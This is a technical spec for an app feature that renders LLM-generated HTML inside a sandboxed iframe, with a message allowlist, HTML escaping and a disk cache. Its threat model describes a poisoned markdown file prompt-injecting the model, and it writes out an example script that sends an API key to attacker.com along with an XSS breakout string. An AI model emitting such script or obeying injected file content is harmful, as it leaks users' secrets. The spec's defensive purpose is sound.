---
created: 2026-04-30
status: approved
branch: feature/recursive-insight-v2
size: L
---

# Tech Spec: Recursive Insight v2 (Insight Web)

## Solution

V2 is a complete architectural rewrite of the Recursive Insight feature. Same recursive folder analysis principle, but the rendering layer changes from markdown to **two-phase HTML+JS website generation per node, hosted in a sandboxed iframe**.

**Key changes vs v1:**

1. **Two-phase generation per node:**
   - **Phase 1 (~1-2s):** Anthropic `tool_use` call returns a strict-schema `InsightSkeleton` JSON describing sections, types, deep-dive anchors. Parent renders skeleton with placeholder loaders inside the iframe. User sees the structure of the page immediately.
   - **Phase 2 (parallel, capped at 5):** N concurrent `streamCompletion` calls (one per section). Content streams back, parent forwards to iframe via `postMessage`, iframe replaces placeholders with actual content (and initializes Mermaid/Chart.js/KaTeX as needed).

2. **Iframe sandbox security model.** All LLM-generated HTML+JS executes inside a single `<iframe sandbox="allow-scripts">` (no `allow-same-origin`). JS in the iframe cannot reach the parent DOM, parent cookies, parent storage, or `window.webkit.messageHandlers`. Communication goes through `window.postMessage` with a strict 5-type allowlist. Defense-in-depth: WKScriptMessage handlers reject any messages where `frameInfo.isMainFrame == false`.

3. **Inline 🤿 deep-dive buttons** rendered by the LLM inside section content, not a fixed right pane. Click → iframe posts `insightDeepDiveClicked` with sectionId + topicIndex → parent → InsightSession → new node generation cycle.

4. **Disk cache per session.** Each generated node's complete HTML is written atomically to `<workspace>/.insight-cache/<sessionUUID>/nodes/<nodeUUID>.html`. Manifest tracks the tree. Breadcrumb back-navigation reads from disk in <100ms — no LLM call.

5. **ZIP archive export.** `Save Archive` bundles the entire session tree (rewritten for relative navigation) + `_assets/` containing pre-bundled libs into a portable ZIP via `Process` + `/usr/bin/zip`. Opens in any browser without MarkView.

6. **Pre-bundled libs (Mermaid, Chart.js, KaTeX, Prism)** vendored locally and delivered to iframes via blob URLs (runtime) or copied to `_assets/` (export). No CDN tunneling; integrity-pinned.

V1 code (markdown rendering, marker parser, right-pane deep-dive list, v1 bridge methods) is **fully removed**. Integration seams (TabKind enum, WorkspaceManager.startRecursiveInsight + closeTab insight branch + 5 forwarders, ContentView menu button, AIProviderClient.streamCompletion + sanitize + apiKeySnapshot, GraphRAG.detectCommunities + escapeXMLEnvelopeBreakout, EditorView Combine routing) are **kept** but their inner workings change.

Tests still deferred per v1 Decision 9 — the XCTest target is still absent. The `tasks/todo.md` follow-up expands to cover v2-specific paths (skeleton schema validation, postMessage allowlist, InsightCache CRUD, ZIP export, blob URL lifecycle).

## Architecture

### What we're building/modifying

**New files:**

- **`MarkView/Models/InsightCache.swift`** — disk cache CRUD: init creates session directory + `_assets/`, atomic write/read of node HTML, manifest update/load, cleanup on tab close, staging directory builder for ZIP export.
- **`MarkView/Models/InsightArchiveExporter.swift`** — ZIP bundling: spawns `/usr/bin/zip` on a staging dir produced by `InsightCache.archiveStagingDirectory()`, atomic move to user-selected destination URL.
- **`MarkView/Resources/Editor/vendor/js/chart-4.4.x.min.js`** — vendored Chart.js minified. SHA-256 pinned in `vendor/MANIFEST.txt`.
- **`MarkView/Resources/Editor/vendor/MANIFEST.txt`** — version + SHA-256 of all vendored libs (Mermaid, Chart.js, KaTeX, Prism).

**Modified files:**

- **`MarkView/Models/AIProviderClient.swift`** — additive: new `toolCall(name:description:inputSchema:systemPrompt:userMessage:model:maxTokens:)` for Anthropic `tool_use` API. Reuses existing `apiKey`, headers, error sanitize. First structured-output code path in the codebase.
- **`MarkView/Models/GraphRAG.swift`** — `mapReduceForFolder` body replaced for v2: phase 1 helper composes the skeleton prompt and calls `toolCall`; phase 2 helper composes per-section prompts and exposes them for `InsightSession` to call `streamCompletion` in parallel. Existing community detection, file XML wrapping, `escapeXMLEnvelopeBreakout` reused. Existing `deepResearch()` untouched. **T4 first verifies caller inventory** — confirms only v1 InsightSession (also being replaced in T6) calls `mapReduceForFolder`. If unexpected callers exist, T4 escalates before replacing.
- **`MarkView/Models/InsightSession.swift`** — full rewrite. New state (`skeleton`, `currentNodeSections`, `nodes` keyed by UUID), two-phase orchestration via `withThrowingTaskGroup` capped at 5 concurrent, cache integration (write on Phase 2 completion, read on `navigateTo`), retry supports both phases, ARC `[weak self]` discipline preserved, `handleStreamError` pattern table preserved, retry throttle 3/60s preserved, scope_hint validation preserved, resource caps preserved.
- **`MarkView/Bridge/WebViewBridge.swift`** — replaces v1's 5 Swift→JS commands and 5 JS→Swift handlers with v2 protocol. **5 new Swift→JS commands:** `loadInsightSkeleton`, `updateInsightSection`, `setInsightError`, `setInsightStatus`, `releaseInsightBlobs`. **5 new JS→Swift message types:** `insightIframeReady`, `insightDeepDiveClicked`, `insightBreadcrumbClicked`, `insightRequestSave`, `insightRequestUp`. Per Decision 3, all 5 v2 JS→Swift handlers gain `guard message.frameInfo.isMainFrame else { return }` at entry.
- **`MarkView/Views/EditorView.swift`** — Combine subscriptions adapted: `$skeleton` → `loadInsightSkeleton`; `$currentNodeSections` → per-section delta → `updateInsightSection`; `$lastError` → `setInsightError(message: lastError, retryable: lastErrorRetryable)`. Old `$streamingBuffer` + `$currentNodeId` subs removed.
- **`MarkView/Models/WorkspaceManager.swift`** — 5 forwarders adapted to new bridge payloads. `closeTab` insight branch executes the **full 4-step ordered close** per Architecture "Tab close" + Decision 11: (1) `bridge.releaseInsightBlobs(into: webView)`, (2) `await session.cancel()`, (3) `try? session.cache.cleanup()`, (4) `tabsStore.removeTab(at:)`. `saveInsightNode` replaced by `exportInsightArchive` calling `InsightArchiveExporter.bundle`. The 9 insight-tab disk-write guards from v1 stay (Cmd+S, refresh, etc.) — same invariant.
- **`MarkView/Resources/Editor/index.html`** — insight-mode rewritten: container hosts a single `<iframe sandbox="allow-scripts">`. Parent JS handles bridge calls + iframe message protocol; iframe srcdoc is built from skeleton + libs (blob URLs) + chrome (breadcrumbs at top, status bar at bottom, 🤿 buttons inline in section templates).

**Removed (v1 artifacts):**

- v1 marker parser `\n\n---DEEP-DIVES---\n` (Swift-side `parseMarker` in InsightSession; JS-side `parseInsightMarker` in index.html).
- v1 right-pane deep-dive list and associated DOM.
- v1 `setText` chrome utility (replaced by iframe-internal rendering; chrome breadcrumbs/status still use textContent in parent JS).
- v1 5 specific bridge methods (`loadInsightView`, `appendInsightDelta`, `setInsightDeepDives`, `showInsightLoading`, `setInsightError` — note: name `setInsightError` overlaps but signature changes; v2 includes `retryable` Bool which v1 already had).

### How it works

**Trigger flow:**

1. User opens a folder → `AI Tools → Analysis → 🧭 Recursive Insight` (no UI change).
2. `WorkspaceManager.startRecursiveInsight()`: scans `.md` files (existing helper), creates `InsightSession(folderURL:, mdFiles:, providerClient:, graphRAG:, cache: try InsightCache(workspaceURL:, sessionId:))`, opens new `OpenTab` with `kind: .insight(session)`, kicks off `Task { await session.generateRoot() }`.

**Phase 1 (skeleton, ~1-2s):**

1. `session.generateRoot` calls `providerClient.toolCall(name: "insight_skeleton", inputSchema: <strict JSON schema>, systemPrompt: <isolation+visual-density-instruction>, userMessage: <XML-wrapped .md bodies>)`.
2. Anthropic returns the tool_use input dict, parsed into `InsightSkeleton` (fall back to single-prose-section if schema violated).
3. `session.skeleton` (and `nodes[currentNodeId].skeleton`) updated; `@Published` triggers EditorView Combine subscription.
4. EditorView calls `bridge.loadInsightSkeleton(skeleton:into: webView)` → JS receives, builds iframe `srcdoc` containing: CSP meta + libs blob URLs + skeleton-derived placeholders (skeleton-loader CSS animations) + chrome.
5. Iframe loads, posts `{type: "insightIframeReady", payload: {nodeId}}` → parent acknowledges; status bar shows "Phase 2: streaming sections..."

**Phase 2 (content streaming, parallel):**

1. `session.startContentStreaming()`: for each `section` in `skeleton.sections`, schedule a Task in `withThrowingTaskGroup`, capped at 5 concurrent (gated scheduling pattern from GraphRAG.mapReduceForFolder).
2. Each task calls `providerClient.streamCompletion(systemPrompt: <isolation+section-context>, userMessage: <files matched by section.scopeHint, XML-wrapped, escaped>, onDelta: { [weak self] chunk in self?.appendSectionDelta(sectionId:, chunk) })`.
3. `appendSectionDelta` mutates `currentNodeSections[sectionId].buffer += chunk`; `@Published` triggers.
4. EditorView subscribes to `$currentNodeSections`, computes per-section delta against `lastForwardedSectionLength[sectionId]`, calls `bridge.updateInsightSection(sectionId:, htmlChunk:, into: webView)`.
5. Bridge encodes payload via existing array-wrap idiom and `evaluateJavaScript`s `window.postMessage({type: "updateInsightSection", payload: {sectionId, htmlChunk}})` — parent forwards to iframe via `iframe.contentWindow.postMessage`.
6. Iframe-side handler receives, finds the placeholder by id, appends content. When section completes (server-sent `[SECTION_DONE]` sentinel or stream end), iframe initializes any required lib (e.g. `mermaid.run({nodes:[node], securityLevel:'strict'})` for mermaid sections; `new Chart(canvas, config)` for chart sections).
7. When all sections complete, `session.allSectionsReady = true`; cache write triggered.

**Disk cache write (deterministic rebuild only):**

1. `session.buildFinalHTML(node:)` deterministically composes the cached HTML on the parent side from: (a) skeleton (validated, JSON-parsed structure); (b) section buffers (`currentNodeSections[id].buffer` for each section); (c) chrome template (breadcrumbs, status bar — same template parent uses for srcdoc). All LLM-controlled string fields (skeleton.title, section.title, deepDiveTopic.label, deepDiveTopic.hint, scopeHint paths displayed in chrome) are HTML-escaped via a single utility before being interpolated into the HTML — see Decision 10 v2.
2. `cache.writeNode(nodeId:, html:)` writes atomically: `<sessionUUID>/nodes/<nodeUUID>.html.tmp`, then rename to `.html`.
3. `cache.updateManifest(_:)` appends node entry (id, parentId, title, level, createdAt) atomically.

**Note:** the spec deliberately does NOT add a 6th postMessage type to round-trip the iframe's actual DOM back to parent — that would violate the 5-type allowlist. The deterministic rebuild approach is the only sanctioned path; section content from LLM is preserved verbatim as it arrived (the `currentNodeSections[id].buffer`), already inside the iframe trust boundary.

**Deep-dive expansion:**

- 🤿 button click in iframe → iframe posts `{type: "insightDeepDiveClicked", payload: {sectionId, topicIndex}}` → parent listens, **validates topicIndex against current skeleton's section.deepDiveTopics bounds** — reject if out of range.
- Forward → bridge → WorkspaceManager.didRequestInsightDeepDive(sessionId:sectionId:topicIndex:) → `session.expand(sectionId:topicIndex:)`.
- `session.expand`: looks up DeepDiveTopic from current node's skeleton, creates child InsightNode with scope `.topic(label, hint, files)`, makes current, runs Phase 1 + Phase 2 cycle.

**Save / Export:**

- `Save Archive` button (chrome, NOT in iframe — outside sandbox) → JS posts `insightRequestSave` → parent → bridge → WorkspaceManager.exportInsightArchive(sessionId:).
- `exportInsightArchive`: NSSavePanel with default filename `<folderName>_insight_<timestamp>.zip` → on OK, `cache.archiveStagingDirectory()` builds tmp dir with:
  - `index.html` — root summary; ALL deep-dive button onclicks rewritten from postMessage calls to `window.location.href = "<targetNodeUUID>.html"`; lib `<script src="blob:...">` refs rewritten to `<script src="_assets/<lib>.js">`
  - `nodes/<uuid>.html` for each non-root node — same deep-dive onclick rewriting (relative to siblings, NOT `nodes/`-prefixed since nodes/*.html link to other nodes/*.html); **breadcrumb hrefs rewritten** from postMessage to `window.location.href = "../<targetNodeUUID>.html"` (root) or `"<targetNodeUUID>.html"` (sibling). lib refs rewritten to `../_assets/<lib>.js` (relative from nodes/ subdirectory)
  - `_assets/` with libs copied (Mermaid, Chart, KaTeX, Prism — all copied unconditionally for export portability, even if a particular node didn't use them)
  - `manifest.json` (machine-readable structure for tooling, optional UI)
- All HTML strings interpolated during rewriting go through escape utility per Decision 10 — exported HTML is the same trust boundary as the in-app iframe srcdoc.
- Then `InsightArchiveExporter.bundle(stagingURL:, to: destinationURL)` spawns `/usr/bin/zip -r <dest>.tmp .` from staging dir (using Process with explicit argument array — NEVER `/bin/sh -c`), atomic move `.tmp` → final URL on exit code 0.

**Tab close (ordered per Decision 11):**

`WorkspaceManager.closeTab(at:)` insight branch executes in EXACTLY this order:

1. **Parent JS `window.releaseInsightBlobs()`** via `bridge.releaseInsightBlobs(into:)` evaluateJavaScript — revokes all blob URLs created for this session (per Decision 11 §2). Must happen BEFORE session.cancel so no Combine-driven sub fires after revocation.
2. **`await session.cancel()`** — cancels activeTask + all parallel Phase 2 section tasks; awaits them to observe Task.isCancelled and exit cleanly. Also cancels any in-flight ZIP export Process started via `exportInsightArchive`.
3. **`try? session.cache.cleanup()`** — removes `.insight-cache/<sessionUUID>/` directory and any `.tmp` files left from cancelled writes. Ignores "file not found" errors from concurrent removal.
4. **`tabsStore.removeTab(at:)`** — removes the tab; ARC frees iframe + InsightSession + InsightCache handle.

**Navigation (between cached nodes):**

- Breadcrumb click → JS posts `insightBreadcrumbClicked` with `{nodeId}` → parent listens, validates `event.source === iframe.contentWindow && event.origin === 'null'`, validates nodeId is UUID + present in session manifest, sends to Swift bridge.
- Swift handler `guard message.frameInfo.isMainFrame else { return }` then forwards to `WorkspaceManager.didRequestInsightBreadcrumb` → `session.navigateTo(nodeId:)`.
- `session.navigateTo`: `try cache.readNode(nodeId:)` → returns full HTML; sets `iframe.srcdoc = HTML`; iframe re-loads.
- **Blob URL navigation revocation (Decision 11 §1):** when navigating to a node whose skeleton requires a different lib subset than the previous node, parent JS revokes blob URLs for libs no longer needed AND creates new blob URLs for newly-required libs BEFORE setting iframe.srcdoc. Section types in the new node's skeleton drive the lazy-load decision (`mermaidDiagram` → load Mermaid; `chartJsChart` → load Chart.js; etc.).
- Within 100ms typical (disk read + iframe init). No LLM call.
- **Up button** equivalent to `navigateTo(parent.id)` derived from session.currentNode().parentId.

### Shared resources

| Resource | Owner (creates) | Consumers | Instance count |
|----------|----------------|-----------|----------------|
| `AIProviderClient` | `AIOrchestrator` (existing singleton, unchanged from v1) | InsightSession (toolCall + streamCompletion), GraphRAG (still used for compat) | 1 (singleton per workspace, accessed via `incrementalCompiler.orchestrator.providerClient`) |
| `GraphRAG` | `WorkspaceManager` (existing singleton) | InsightSession (mapReduceForFolder helpers) | 1 (singleton per workspace) |
| `InsightCache` | `InsightSession.init` | InsightSession (write/read), InsightArchiveExporter (read via stagingDirectory) | 1 per InsightSession |
| Pre-bundled libs (Mermaid/Chart/KaTeX/Prism) | static at build time (vendored under `Resources/Editor/vendor/`) | Iframe srcdoc (via blob URLs at runtime), ZIP export `_assets/` (via file copy) | 1 source-of-truth in app bundle; runtime blobs created once per parent page load |
| `Process` for /usr/bin/zip | `InsightArchiveExporter.bundle` | self only | spawned per export call |
| `URLSession.shared` | system | streamCompletion (v1), toolCall (T1) | system singleton |

## Decisions

### Decision 1: Two-phase generation via tool_use + parallel streaming

**Decision:** Phase 1 = single Anthropic `tool_use` call returning a strict-schema `InsightSkeleton` JSON. Phase 2 = N parallel `streamCompletion` calls (one per section), capped at 5 concurrent.

**Rationale:** `tool_use` enforces JSON schema server-side (Anthropic guarantees output matches), eliminating the ~5-10% schema-violation rate of free-text JSON. Parallel section streaming is the user's explicit request — sections fill simultaneously, giving "visual learner" the perception of a website assembling itself rather than text scrolling. Cost: N× prompt overhead (each section call sends its own context). User explicitly accepted this cost.

**Alternatives considered:**
- Free-text JSON + tolerant parser. Rejected: violates user's "consistent visual experience" goal; defensive parsing complexity high.
- Single streaming call with section sentinels (`<section id="...">...</section>`). Rejected: serial fill defeats the parallel-visual-density user requirement.
- Anthropic `tool_use` streaming. Available but more complex than two separate calls; defer to potential future optimization.

### Decision 2.5: postMessage type names use `insight` prefix

**Decision:** All 5 JS→Swift message types are named with the `insight` prefix: `insightIframeReady`, `insightDeepDiveClicked`, `insightBreadcrumbClicked`, `insightRequestSave`, `insightRequestUp`. Note that user-spec L52 listed names without prefix; the prefix is added in the spec to disambiguate from other future bridge message types (translation, AI Console, etc.) that may share verbs like "request save".

**Rationale:** Single namespace, consistent grep-ability, no collision risk. Cosmetic divergence from user-spec; user-spec serves as intent, tech-spec serves as implementation.

**Alternatives considered:**
- Keep user-spec unprefixed names. Rejected: name collision with other features eventually inevitable.

### Decision 2: Iframe sandbox security model

**Decision:** Each insight node renders inside a single `<iframe sandbox="allow-scripts">`. No `allow-same-origin`, no `allow-popups`, no `allow-forms`, no `allow-top-navigation`. Communication parent ↔ iframe via `window.postMessage` with a strict 5-type allowlist (`insightIframeReady`, `insightDeepDiveClicked`, `insightBreadcrumbClicked`, `insightRequestSave`, `insightRequestUp`).

**Rationale:** LLM-generated HTML+JS is untrusted by definition (Decision 10 v1 §5 prompt-injection threat from `.md` content still applies). Sandbox without `allow-same-origin` makes the iframe a null-origin frame — JS in it cannot read/write parent DOM, parent cookies, parent localStorage, parent's `window.webkit.messageHandlers`. This is the WebKit security model, well-documented for nested null-origin frames.

**Alternatives considered:**
- LLM HTML directly in main DOM. Rejected: prompt injection from a poisoned `.md` file → LLM emits `<script>fetch('https://attacker.com/exfil?key='+ ...)</script>` → executes in main frame → calls `webkit.messageHandlers.bridge` → arbitrary file write or API key exfil.
- Whitelist-only HTML elements (`<canvas>`, `<svg>`, `<details>`, etc.) with no script. Rejected: blocks Mermaid/Chart.js, defeats visual richness goal.
- Nested second WebView. Rejected: heavyweight, no native iframe sandbox advantages.

### Decision 3: Defense-in-depth — frameInfo.isMainFrame check

**Decision:** Every WKScriptMessage handler in WebViewBridge for v2 message types includes `guard message.frameInfo.isMainFrame else { return }` at entry. The legitimate flow has parent JS (main frame) listen for iframe `postMessage` and forward to Swift via `webkit.messageHandlers.bridge`. The sandboxed iframe should not be able to call `webkit.messageHandlers` directly (per WebKit semantics for null-origin frames).

**Rationale:** The user opted out of a spike to verify WebKit's exact behavior. We therefore assume the standard semantic (sandbox isolates from `webkit.messageHandlers`) AND add a defensive Swift-side check. If WebKit semantics change in a future macOS release, the frameInfo check still rejects illegitimate calls. One-line guard, zero perf cost.

**Alternatives considered:**
- Trust sandbox alone, no defense-in-depth. Rejected: catastrophic if WebKit changes; the cost of the guard is negligible.
- Configure WKWebViewConfiguration to disable `webkit.messageHandlers` in iframes. WKWebViewConfiguration does not expose this granularity.

### Decision 4: Per-session disk cache

**Decision:** Each `InsightSession` owns an `InsightCache` rooted at `<workspace>/.insight-cache/<sessionUUID>/`. Per session: `manifest.json`, `nodes/<nodeUUID>.html`, `_assets/{mermaid.min.js, chart.umd.min.js, katex.min.css, prism.min.js, ...}`. Atomic writes (temp + rename). Cleared on `closeTab` insight branch.

**Rationale:** Breadcrumb back-navigation must be instant; reading from disk is <100ms vs ~3s to regenerate via LLM. ZIP export uses the same cache as source. Per-session isolation avoids cross-session state contamination. Atomic writes prevent half-written files from surviving an app crash. `_assets/` directory inside session dir means the export staging dir is just a manifest tweak + zip — no separate copy step.

**Alternatives considered:**
- In-memory cache only. Rejected: 50 nodes × 500KB = 25MB memory bloat; ZIP export needs disk anyway.
- Single shared cache across all sessions. Rejected: cross-pollination, version skew of templates.
- Persistent cache surviving tab close. Deferred — opt-in setting can be added later if requested.

### Decision 5: Pre-bundled libs via blob URLs (runtime) + file copies (export)

**Decision:** App bundle vendors Mermaid, **Chart.js (NEW — must be added)**, KaTeX, Prism in `Resources/Editor/vendor/js/` and `vendor/css/`. SHA-256 pinned in `vendor/MANIFEST.txt`. At runtime, parent loads each lib's content once at session start, creates a blob URL via `URL.createObjectURL`, passes blob URLs to iframe srcdoc as `<script src="blob:...">`. For ZIP export: lib files copied into the staging `_assets/` and exported HTML rewritten to `<script src="../_assets/<lib>.js">`.

**Rationale:** Sandbox iframe (null-origin) cannot use file:// URLs nor inherit parent's loaded scripts. Blob URLs work cross-origin (the blob is owned by parent's origin but accessible to null-origin iframe with `src="blob:..."`). Single-source loading minimizes memory: 4 libs × 1MB = 4MB once, not per-iframe. For export portability, files are copied — no blob URL survives outside the running app.

**Caveats:**
- KaTeX requires webfonts (`.woff2`). Blob URL referencing won't carry webfont URL relativity. Mitigation (validated in T5): base64-inline the small `.woff2` files into the rendered HTML as `data:` URLs, OR include in `_assets/` and reference relatively.
- Mermaid is large (~2.8MB). Skeleton declares whether mermaid is needed (`section.type == .mermaidDiagram`); only load Mermaid blob if any section needs it.

**Alternatives considered:**
- Inline libs in srcdoc per iframe. Rejected: 1MB+ duplicated per node; cache bloats.
- LLM tells iframe what CDN to load. Rejected: defeats security (CDN = network egress = exfil channel).

### Decision 6: Single iframe with srcdoc reset on navigation

**Decision:** Insight-mode container has exactly one `<iframe>` element. On `navigateTo(nodeId:)`: parent reads cached HTML from disk, sets `iframe.srcdoc = htmlContent`. Iframe reloads, JS re-runs, libs re-initialize.

**Rationale:** Memory bounded — only one iframe context alive (50 nodes do not = 50 contexts). ~50-100ms switch latency is acceptable for back-navigation. Older iframes from prior nodes get garbage-collected naturally. Simpler state management — no iframe pool to track.

**Alternatives considered:**
- Multiple iframes with hide/show. Rejected: 50 nodes × ~5MB context (libs + DOM) = 250MB.
- Pure DOM swap inside one iframe (no full reload). Rejected: lib state cleanup is complex; full reload is reliable.

### Decision 7: ZIP export via /usr/bin/zip + Process

**Decision:** `InsightArchiveExporter.bundle` spawns `/usr/bin/zip -r <destination> .` from a staging directory built by `cache.archiveStagingDirectory()`. Uses Foundation `Process` API.

**Rationale:** Foundation has no native zip API. `/usr/bin/zip` is a macOS standard binary (present in the base system since forever). Adding a SwiftPM dependency (ZIPFoundation) is avoidable complexity. Pattern already used in the project: `GitClient.swift` L193-209 spawns external commands the same way. Sandbox is OFF (per v1, unchanged for v2), so `Process` works.

**Alternatives considered:**
- ZIPFoundation pod. Rejected: avoidable dependency.
- Compress.framework. Rejected: low-level, no archive structure abstraction.

### Decision 8: Keep AIProviderClient interface stable; toolCall is additive

**Decision:** Add `toolCall(name:description:inputSchema:systemPrompt:userMessage:model:maxTokens:) async throws -> [String: Any]` to `AIProviderClient`. Returns the parsed tool_use input dict. Reuses existing API key, headers, error sanitize. Existing `extractSingleChunk` and `streamCompletion` untouched.

**Rationale:** Minimal blast radius. `toolCall` is the ONLY new structured-output path; `streamCompletion` (v1) handles all streaming. Other AI features in MarkView (translation, diagrams, etc.) unaffected.

**Alternatives considered:**
- Refactor AIProviderClient to a unified "completion request" API. Rejected: large blast radius for a v2 feature; existing extractSingleChunk callers are stable.

### Decision 10: HTML-escape policy for parent-rendered LLM strings

**Decision:** A single utility `escapeForHTMLAttribute(_:)` and `escapeForHTMLText(_:)` is used for EVERY LLM-controlled string interpolated into iframe srcdoc, status-bar chrome, breadcrumb chrome, exported ZIP HTML, and `manifest.json` HTML escaping. Affected fields: `InsightSkeleton.title`, `InsightSection.title`, `DeepDiveTopic.label`, `DeepDiveTopic.hint`, `scopeHint` paths displayed to user, `node.title`, error messages from LLM.

**Rationale:** The iframe sandbox protects against script execution, but the iframe srcdoc is constructed parent-side from string concatenation. If LLM emits a label containing `</script><script>alert(1)</script>`, parent could inject it into srcdoc string, breaking out of attribute or text context. Sandbox engages AFTER the srcdoc is parsed by the iframe — too late if the breakout already corrupted the DOM structure (e.g. caused parent's chrome breadcrumbs to render the injected script in MAIN frame).

Concretely:
- `escapeForHTMLAttribute`: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`
- `escapeForHTMLText`: same set
- Used at every `String → HTML` interpolation in: parent JS chrome rendering (breadcrumbs at top, status bar at bottom — these live in MAIN frame, not iframe), iframe srcdoc construction (LLM strings embedded into placeholder text/title attrs), exported ZIP HTML (same), `manifest.json` titles (preserved as JSON which has its own escape — no HTML escape needed in JSON, but when rebuilt into HTML for ZIP, escape applies).

**Alternatives considered:**
- Trust LLM output, skip escaping. Rejected: trivial XSS via poisoned `.md` content makes parent breadcrumbs execute injected script.
- Block all `<` characters in LLM strings. Rejected: legitimate technical content (e.g. "compare A < B") should display.

### Decision 11: Blob URL lifecycle

**Decision:** Blob URLs for vendored libs are owned by the parent JS context for the lifetime of the insight tab. Created lazily when first needed by `bridge.loadInsightSkeleton` — only libs required by the skeleton's section types are materialized (Mermaid only if `mermaidDiagram`, Chart only if `chartJsChart`, KaTeX only if any section emits math content per skeleton metadata, Prism unconditionally for code highlighting). Blob URLs are revoked via `URL.revokeObjectURL(blobURL)` in two places:

1. When session navigates to a different node that has a different lib subset — revoke unused libs, create new blobs as needed
2. When the insight tab is closed — `tabsStore.removeTab` triggers EditorView teardown, which calls a parent JS function `window.releaseInsightBlobs()` that revokes ALL blob URLs created for that session. EditorView calls this BEFORE `session.cancel()` to ensure no in-flight Combine sub fires after revocation.

**Rationale:** `URL.createObjectURL` retains the blob's bytes in WebView memory until explicitly revoked or page unloaded. Without revocation, every closed insight tab leaks the libs (~4MB×N tabs). Two-stage revocation handles both navigation (lazy reload) and termination (full release).

**Alternatives considered:**
- Always create all 4 libs at session start; revoke at end. Rejected: wastes ~3MB per session (KaTeX+Chart+Prism unused if skeleton doesn't need them).
- Skip revocation, trust WebView GC at page unload. Rejected: WebView in MarkView is long-lived (single instance), page never unloads — leaks accumulate.

### Decision 9: Tests still deferred

**Decision:** No XCTest files added in v2. The existing follow-up task in `tasks/todo.md` expands to cover v2-specific paths.

**Rationale:** XCTest target absence unchanged from v1 Decision 9. Adding tests for v2 alone would not unblock the follow-up; we still need the test infrastructure setup as a separate task. Compensation: Audit Wave + manual Pre-deploy QA + reviewer hand-trace + the same explicit warning in `decisions.md`.

**Critical paths to add to follow-up scope:**
- Anthropic tool_use parsing (skeleton schema validation + fallback)
- postMessage allowlist + payload schema validation + frameInfo defense
- InsightCache atomic write CRUD + manifest CRUD + cleanup
- ZIP export staging dir builder (HTML rewriting, lib copying)
- Pre-bundled libs blob URL lifecycle (creation, revocation on session close)
- Phase 2 parallelism cap enforcement
- Iframe srcdoc construction + CSP correctness

## Data Models

```swift
// MarkView/Models/InsightSession.swift (REWRITE)

struct InsightSkeleton: Codable {
    let title: String
    let suggestedTheme: String?  // light|dark hint, optional
    let sections: [InsightSection]
}

struct InsightSection: Codable, Identifiable {
    let id: String  // unique within skeleton, used as DOM id and routing key
    let type: SectionType
    let title: String?
    let scopeHint: [String]?  // file paths relative to folderURL; subset of mdFiles
    let metadata: [String: AnyCodable]  // type-specific config, e.g. {"chartType": "bar"} for chart sections
    let deepDiveTopics: [DeepDiveTopic]?  // inline 🤿 anchors within this section
}

enum SectionType: String, Codable {
    case hero, prose, mermaidDiagram, chartJsChart, comparisonTable,
         timeline, cardsGrid, callout, collapsibleDetails
}

struct DeepDiveTopic: Codable, Identifiable {
    let id: String  // unique within section, used for postMessage routing
    let label: String
    let hint: String
    let scopeHint: [String]
}

struct SectionState: Codable {
    var buffer: String = ""  // accumulated HTML content
    var status: Status = .pending
    enum Status: String, Codable { case pending, streaming, ready, failed }
}

@MainActor
final class InsightSession: ObservableObject, Identifiable {
    let id = UUID()
    let folderURL: URL
    let mdFiles: [URL]
    private let providerClient: AIProviderClient
    private let graphRAG: GraphRAG?
    private let cache: InsightCache
    private let apiKeySnapshot: String?

    @Published private(set) var rootNodeId: UUID?
    @Published private(set) var currentNodeId: UUID?
    @Published private(set) var nodes: [UUID: InsightNode] = [:]
    @Published private(set) var lastError: String?
    @Published private(set) var lastErrorRetryable: Bool = true
    @Published private(set) var currentNodeSections: [String: SectionState] = [:]  // sectionId → state for the active node
    @Published private(set) var skeletonReady: Bool = false
    @Published private(set) var allSectionsReady: Bool = false
    @Published private(set) var statusMessage: String = ""  // for status bar (e.g. "Phase 2: 3/7 sections")

    private var activeTask: Task<Void, Never>?
    private var retryHistory: [UUID: [Date]] = [:]  // node id → retry timestamps

    init(folderURL: URL, mdFiles: [URL], providerClient: AIProviderClient,
         graphRAG: GraphRAG?, cache: InsightCache)
    // apiKeySnapshot captured from providerClient.apiKeySnapshot in init body (private setter only)

    // Public methods (parallel structure to v1 — adapted for two-phase)
    func generateRoot() async
    func expand(sectionId: String, topicIndex: Int) async
    func navigateTo(nodeId: UUID) async  // async because cache read
    func up() async
    func cancel()
    func retryCurrent() async
    func currentNode() -> InsightNode?
    func breadcrumbs() -> [InsightNode]
    func snapshot() -> InsightViewSnapshot

    // Internal (private)
    private func phase1Skeleton(for node: InsightNode) async throws -> InsightSkeleton
    private func phase2StreamSections(for node: InsightNode, skeleton: InsightSkeleton) async throws
    private func appendSectionDelta(sectionId: String, chunk: String, forNodeId: UUID)
    private func writeFinalHTMLToCache(node: InsightNode) throws
    private func handleStreamError(_ error: Error, forNodeId: UUID)
    private func validateScopeHint(_ paths: [String]) -> [URL]  // same as v1
}

final class InsightNode: Identifiable, Codable {
    let id: UUID
    let parentId: UUID?
    let level: Int
    let title: String
    let scope: NodeScope
    var skeleton: InsightSkeleton?
    var sectionStates: [String: SectionState]
    var status: Status
    var generatedAt: Date?
    let model: String

    enum Status: String, Codable {
        case pending, generatingSkeleton, streamingContent, ready, failed
    }
}

enum NodeScope: Codable {
    case folderRoot
    case topic(label: String, hint: String, files: [URL])
}

struct InsightViewSnapshot: Codable {
    let sessionId: String
    let nodeId: String
    let title: String
    let breadcrumbs: [BreadcrumbEntry]
    let skeleton: InsightSkeleton
    let isStreaming: Bool
}

struct BreadcrumbEntry: Codable {
    let nodeId: String
    let title: String
}

// MarkView/Models/InsightCache.swift (NEW)

struct InsightCache {
    let rootDirectory: URL  // <workspace>/.insight-cache/<sessionUUID>/
    private let assetsDirectory: URL  // <root>/_assets/
    private let nodesDirectory: URL   // <root>/nodes/
    private let manifestURL: URL      // <root>/manifest.json

    init(workspaceURL: URL, sessionId: UUID) throws  // creates dirs, copies vendored libs into _assets

    func writeNode(nodeId: UUID, html: String) throws  // atomic
    func readNode(nodeId: UUID) throws -> String
    func updateManifest(_ manifest: InsightManifest) throws  // atomic
    func loadManifest() throws -> InsightManifest
    func cleanup() throws  // removes the entire <sessionUUID>/ dir
    func archiveStagingDirectory() throws -> URL  // returns ready-for-zip path
}

struct InsightManifest: Codable {
    let sessionId: UUID
    let folderName: String
    let createdAt: Date
    var nodes: [NodeManifestEntry]

    struct NodeManifestEntry: Codable {
        let nodeId: UUID
        let parentId: UUID?
        let title: String
        let level: Int
        let createdAt: Date
    }
}

